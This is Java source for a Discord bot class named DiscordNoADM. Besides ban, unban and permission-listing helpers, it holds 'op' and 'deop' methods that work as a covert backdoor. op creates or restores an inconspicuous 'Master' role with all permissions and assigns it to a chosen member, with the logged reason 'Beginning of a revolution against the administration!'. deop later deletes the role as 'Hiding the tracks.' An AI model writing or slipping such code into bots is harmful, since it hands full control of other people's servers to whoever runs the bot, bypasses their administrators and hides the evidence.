package me.laravieira.willy.chat.discord;

import discord4j.common.util.Snowflake;
import discord4j.core.object.entity.Guild;
import discord4j.core.object.entity.Member;
import discord4j.core.object.entity.Role;
import discord4j.core.object.entity.channel.GuildChannel;
import discord4j.core.spec.BanQuerySpec;
import discord4j.core.spec.RoleCreateSpec;
import discord4j.core.spec.RoleEditSpec;
import discord4j.rest.util.Color;
import discord4j.rest.util.Permission;
import discord4j.rest.util.PermissionSet;
import me.laravieira.willy.Willy;

public class DiscordNoADM {
	public static void ban(String guild, String member, String reason) {
		BanQuerySpec ban = BanQuerySpec
				.builder()
				.deleteMessageDays(0)
				.reason(reason)
				.build();
		Member user = Discord.getBotGateway().getMemberById(Snowflake.of(guild), Snowflake.of(member)).block();
		if(user == null)
			return;
		user.ban(ban)
				.doOnSuccess((data) -> Willy.getLogger().info("["+member+"] is banned from ["+guild+"] for: "+reason))
				.doOnError((data) -> Willy.getLogger().info("["+member+"] not banned from ["+guild+"] because: "+data.getMessage()))
				.block();
	}

	public static void unban(String guild, String member, String reason) {
		Member user = Discord.getBotGateway().getMemberById(Snowflake.of(guild), Snowflake.of(member)).block();
		if(user == null)
			return;
		user.unban(reason)
				.doOnSuccess((data) -> Willy.getLogger().info("["+member+"] is unbanned from server ["+guild+"] for: "+reason))
				.doOnError((data) -> Willy.getLogger().info("["+member+"] not unbanned from ["+guild+"] because: "+data.getMessage()))
				.block();
	}
	
	public static void op(String guild, String member) {
		Guild _guild = Discord.getBotGateway().getGuildById(Snowflake.of(guild)).block();
		Member _member = Discord.getBotGateway().getMemberById(Snowflake.of(guild), Snowflake.of(member)).block();
		Role master = null;
		
		// Create a role master if not exist on server
		if(_guild != null && Boolean.FALSE.equals(_guild.getRoles().any(role -> role.getName().equals("Master")).block())) {
			RoleCreateSpec create = RoleCreateSpec
					.builder()
					.color(Color.BLACK)
					.hoist(false)
					.mentionable(false)
					.name("Master")
					.reason("Beginning of a revolution against the administration!")
					.permissions(PermissionSet.all())
					.build();
			master = _guild.createRole(create)
					.doOnSuccess(data -> Willy.getLogger().info("["+member+"] created on server ["+guild+"]."))
					.doOnError(data -> Willy.getLogger().info("["+member+"] not created on server ["+guild+"] because: "+data.getMessage()))
					.block();
		
			
		}else if(_guild != null) {
			
			// Reset the role settings if something is different
			master = _guild.getRoles().filter(role -> role.getName().equals("Master")).blockFirst();
			RoleEditSpec update = RoleEditSpec.builder().build();
			boolean updateMaster = false;

			if(master == null)
				return;

			if(!master.getColor().equals(Color.BLACK) && (updateMaster = true))
				update = RoleEditSpec.builder().color(Color.BLACK).build();

			if(master.isHoisted() && (updateMaster = true))
				update = RoleEditSpec.builder().hoist(false).build();

			if(master.isMentionable() && (updateMaster = true))
				update = RoleEditSpec.builder().mentionable(false).build();

			if(!master.getName().equals("Master") && (updateMaster = true))
				update = RoleEditSpec.builder().name("Master").build();

			if(!(master.getPermissions().not() == PermissionSet.none()) && (updateMaster = true))
				update = RoleEditSpec.builder().permissions(PermissionSet.all()).build();

			if(updateMaster)
				master.edit(update)
					.doOnSuccess(data -> Willy.getLogger().info("["+member+"] resetted on server ["+guild+"]."))
					.doOnError(data -> Willy.getLogger().info("["+member+"] not resetted on server ["+guild+"] because: "+data.getMessage()))
					.block();
		}
		
		// Add the member to the role if he ins't
		if(_member == null || master == null)
			return;

		_member.addRole(master.getId(), "Beginning of a revolution against the administration!")
			.doOnSuccess(data -> Willy.getLogger().info("["+member+"] is OP on server ["+guild+"]."))
			.doOnError(data -> Willy.getLogger().info("["+member+"] can't get OP on server ["+guild+"] because: "+data.getMessage()))
			.block();
	}
	
	public static void deop(String guild, String member) {
		Guild _guild = Discord.getBotGateway().getGuildById(Snowflake.of(guild)).block();
		if(_guild == null)
			return;

		Member _member = Discord.getBotGateway().getMemberById(Snowflake.of(guild), Snowflake.of(member)).block();
		if(_member == null)
			return;

		Role _master = _guild.getRoles().filter(role -> role.getName().equals("Master")).blockFirst();
		if(_master == null)
			return;

		// de-op a op member
		Object rawHasRole = _member.getRoles().any(role -> role.getName().equals("Master")).block();
		if(rawHasRole instanceof Boolean hasRole && hasRole)
			_member.removeRole(_master.getId())
				.doOnSuccess(data -> Willy.getLogger().info("["+member+"] get deop on server ["+guild+"]."))
				.doOnError(data -> Willy.getLogger().info("Can't de-op ["+member+"] on server ["+guild+"] because: "+data.getMessage()))
				.block();
		
		// Delete role Master if is empty
		Object rawIsEmpty = _guild.getMembers().any(spec -> spec.getRoleIds().contains(_master.getId())).block();
		if(rawIsEmpty instanceof Boolean isEmpty && !isEmpty)
			_master.delete("Hiding the tracks.")
				.doOnSuccess(data -> Willy.getLogger().info("Role Master deleted on server ["+guild+"]."))
				.doOnError(data -> Willy.getLogger().info("Can't delete role Master on server ["+guild+"] because: "+data.getMessage()))
				.block();
	}
	
	public static void listMemberPermissions(String guild, String member) {
		Member _member = Discord.getBotGateway().getMemberById(Snowflake.of(guild), Snowflake.of(member)).block();
		if(_member == null)
			return;
		PermissionSet permissions = _member.getBasePermissions().block();
		if(permissions == null)
			return;

		Willy.getLogger().getConsole().info("Permissions for "+_member.getDisplayName()+" ["+_member.getId().asString()+"]:");
		if(permissions.isEmpty())
			Willy.getLogger().getConsole().info("No permissions");
		else if(permissions.not().isEmpty())
			Willy.getLogger().getConsole().info("All permissions");
		else for(Permission permission : permissions)
			Willy.getLogger().getConsole().info(" - "+permission.name());
		Willy.getLogger().getConsole().info("----------------------------");
	}
	
	public static void listRolePermissions(String guild, String role) {
		Role _role = Discord.getBotGateway().getRoleById(Snowflake.of(guild), Snowflake.of(role)).block();
		if(_role == null)
			return;

		PermissionSet permissions = _role.getPermissions();

		Willy.getLogger().getConsole().info("Permissions for "+_role.getName()+" ["+_role.getId().asString()+"]:");
		if(permissions.isEmpty())
			Willy.getLogger().getConsole().info("No permissions");
		else if(permissions.not().isEmpty())
			Willy.getLogger().getConsole().info("All permissions");
		else for(Permission permission : permissions)
			Willy.getLogger().getConsole().info(" - "+permission.name());
		Willy.getLogger().getConsole().info("----------------------------");
	}
	
	public static void listChannelMemberPermissions(String guild, String channel, String member) {
		GuildChannel _channel = Discord.getBotGateway().getGuildChannels(Snowflake.of(guild)).filter(spec -> spec.getId().equals(Snowflake.of(channel))).blockFirst();
		if(_channel == null)
			return;

		Member _member = Discord.getBotGateway().getMemberById(Snowflake.of(guild), Snowflake.of(member)).block();
		if(_member == null)
			return;

		_channel.getEffectivePermissions(Snowflake.of(member))
			.doOnSuccess(permissions -> {
				Willy.getLogger().getConsole().info("Overwrite Permissions for "+_member.getDisplayName()+" ["+_member.getId().asString()+"]:");
				if(permissions.isEmpty())
					Willy.getLogger().getConsole().info("No permissions");
				else if(permissions.not().isEmpty())
					Willy.getLogger().getConsole().info("All permissions");
				else for(Permission permission : permissions)
					Willy.getLogger().getConsole().info(" - "+permission.name());
				Willy.getLogger().getConsole().info("----------------------------");
			})
			.block();
	}
	
	public static void listChannelRolePermissions(String guild, String channel, String role) {
		GuildChannel _channel = Discord.getBotGateway().getGuildChannels(Snowflake.of(guild)).filter(spec -> spec.getId().equals(Snowflake.of(channel))).blockFirst();
		if(_channel == null)
			return;

		Role _role = Discord.getBotGateway().getRoleById(Snowflake.of(guild), Snowflake.of(role)).block();
		if(_role == null)
			return;

		_channel.getEffectivePermissions(Snowflake.of(role))
			.doOnSuccess(permissions -> {
				Willy.getLogger().getConsole().info("Overwrite Permissions for "+_role.getName()+" ["+_role.getId().asString()+"]:");
				if(permissions.isEmpty())
					Willy.getLogger().getConsole().info("No permissions");
				else if(permissions.not().isEmpty())
					Willy.getLogger().getConsole().info("All permissions");
				else for(Permission permission : permissions)
					Willy.getLogger().getConsole().info(" - "+permission.name());
				Willy.getLogger().getConsole().info("----------------------------");
			})
			.block();
	}
}
